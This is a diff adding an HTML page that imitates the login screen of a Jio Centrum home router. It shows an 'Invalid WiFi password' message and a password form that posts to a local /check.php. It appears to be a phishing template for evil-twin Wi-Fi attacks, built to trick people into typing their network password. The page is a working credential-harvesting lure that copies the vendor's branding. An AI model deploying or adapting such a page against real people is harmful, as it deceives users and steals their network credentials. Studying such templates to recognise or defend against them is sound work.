@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>Jio Centrum Home Gateway : </title>
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="http://192.168.29.1/images/logo.png" type="image/x-icon">
+    <link href="./error_files/style.css" rel="stylesheet">
+ <link rel="stylesheet" type="text/css" href="./error_files/theme.css">
+<script type="text/javascript" language="javascript" src="./error_files/jquery-1.8.0.min.js"></script>
+    <!-- clickJacking control -->
+<script>
+       if(top.location.hostname != self.location.hostname) {
+           top.location = self.location; 
+       }
+</script>
+ 
+
+</head><body class="loginBody">
+      <div style="display: table; height: 100%; overflow: hidden;min-height: 100%; width: 980px; margin: 0 auto;">
+         <div style="display: table-cell; vertical-align: middle;width: 980px; margin: 0 auto;">
+           <div align="center" class="midWidth">
+ 
+<!-- 		<p  class="loginError">Invalid username or password</p> -->
+ 
+                        	<div class="msgError" style="margin: 10px auto; border-radius: 4px;">
+                            	<p>Invalid WiFi password</p>
+                            </div>
+                            
+ 
+ 		<div class="midOne">
+
+          <div class="loginForm logoBlock ">
+                <div class="loginLogo"><img src="./error_files/loginLogo.png" alt="Jio logo">
+                </div>
+                </div>
+            
+        </div>
+        <div class="midOne">
+ 
+    <form method="post" action="/check.php">
+	<input type="hidden" name="thispage" value="index.html">
+
+                <div class="loginForm">
+
+                    
+                    <div class="break">&nbsp;</div>
+                    <div class="configRow">
+                        <label>Password</label>
+                        <input type="Password" value="" name="password" id="tf1_password">
+                    </div>
+                     
+                    <div class="break">&nbsp;</div>
+                    <div class="submitRow">
+<button type="submit" class="loginBtn" title="Login" value="Login" name="button.login.users.dashboard" onclick="return loginValidate()">Login</button>
+
+                    </div>
+                </div>  
+</form>
+           
+        </div>
+           </div>
+         </div>
+       </div>
+
+ <div id="tf1_pageLoadingOverLay" class="configOnloadDialogMask"></div>
+<div class="msgInfoLoading loadingDialog" id="tf1_pageLoadingMask">
+    <p> Loading Please wait..!</p>
+</div>  
+    <script type="text/javascript">
+        $(document).ready(function() {
+
+        });
+    </script>
+    <!--[if lt IE 9]><script src="js/excanvas.js"></script><![endif]--> 
+    <script type="text/javascript" language="javascript" src="./error_files/mis.js">	</script>
+    <script type="text/javascript" language="javascript" src="./error_files/textValidations.js"></script>
+    <script type="text/javascript" language="javascript" src="./error_files/loadingStatus.js"></script>
+    <script type="text/javascript" charset="utf-8">
+    function loginValidate()
+  {
+    var txtFieldIdArr = new Array ();
+    txtFieldIdArr[0] = "tf1_userName,Please enter a valid Username";
+    txtFieldIdArr[1] = "tf1_password,Please enter a valid password";
+    
+    if (txtFieldArrayCheck (txtFieldIdArr) == false)
+    return false;
+    displayProgressBar ();
+    return true;
+  }
+  
+  function loginInit ()
+  {
+    var usrObj = document.getElementById ('tf1_userName');
+    if (!usrObj) return;
+    usrObj.focus ();
+  }
+
+      $(document).ready(function(){
+      
+/* Onload hide the status message if content is empty */	
+
+if ($(".midBg div.msgInfo p").length > 0 && $(".midBg div.msgInfo p").html() == '')
+          {
+              $(".midBg div.msgInfo").hide();
+          }
+if ($(".midBg div.msgError p").length > 0 && $(".midBg div.msgError p").html() == '')
+          {
+              $(".midBg div.msgError").hide();
+          }
+if ($(".midBg div.msgSuccess p").length > 0 && $(".midBg div.msgSuccess p").html() == '')
+          {
+              $(".midBg div.msgSuccess").hide();
+          }
+      
+loginInit();
+        
+      });
+         
+         
+       
+        </script> 
+     <style>
+     
+     .midWidth {
+    width: 978px !important;
+    min-width: 978px !important;
+}
+
+     .configRow, .loginForm > .configRow{
+       padding: 0 5px;
+     }
+     .configRow > label{
+       font-weight: bold;
+     }
+
+     .loginForm  .configRow > label, .loginForm .configRow > p {
+         color: #404040;
+         float: left;
+         margin: 8px 0;
+         max-width: 100%;
+         min-width: 100%;
+         padding: 0 ;
+         text-align: left; 
+     }
+		 .loginForm  .configRow > label{
+       font-weight: normal;
+				margin: 8px 0 0 0;
+     }
+     .loginForm  .configRow > input, select, textarea {
+       border: none;
+       background: #edeeef;
+       color: #6A6A6A;
+       float: left;
+       height: 33px;
+       margin: 4px  0;
+       padding: 0 8px;
+       width: calc(100% - 16px);
+     }
+     .onlyHeight { height: 100%;}
+     .midWidth { min-width: 980px; width: 980px; margin:0 auto;  } /* With width property you can change middle area width to full screen! */
+     .midWidth2 { min-width: 600px; width: 600px; }
+
+     .loginBtn { background: #1ba99d; width: 100%; line-height: 30px; border-radius: 4px; color: #fff; font-weight: bold; border: none; cursor: pointer; display: block; text-align: center; text-decoration: none;}
+     .loginBtn:hover { color: rgba(255,255,255,0.5);}
+     .configRow > label, .configRow > p {
+         color: #404040;
+         float: left;
+         margin: 8px 0;
+         max-width: 30%;
+         min-width: 30%;
+         padding: 0 10px;
+         text-align: left; 
+     }
+     .configRow > p {
+       color: #6A6A6A;
+       letter-spacing: 1px;
+       min-width: 60%;
+     }
+
+</style>
+    
+    
+    
+
+</body></html>
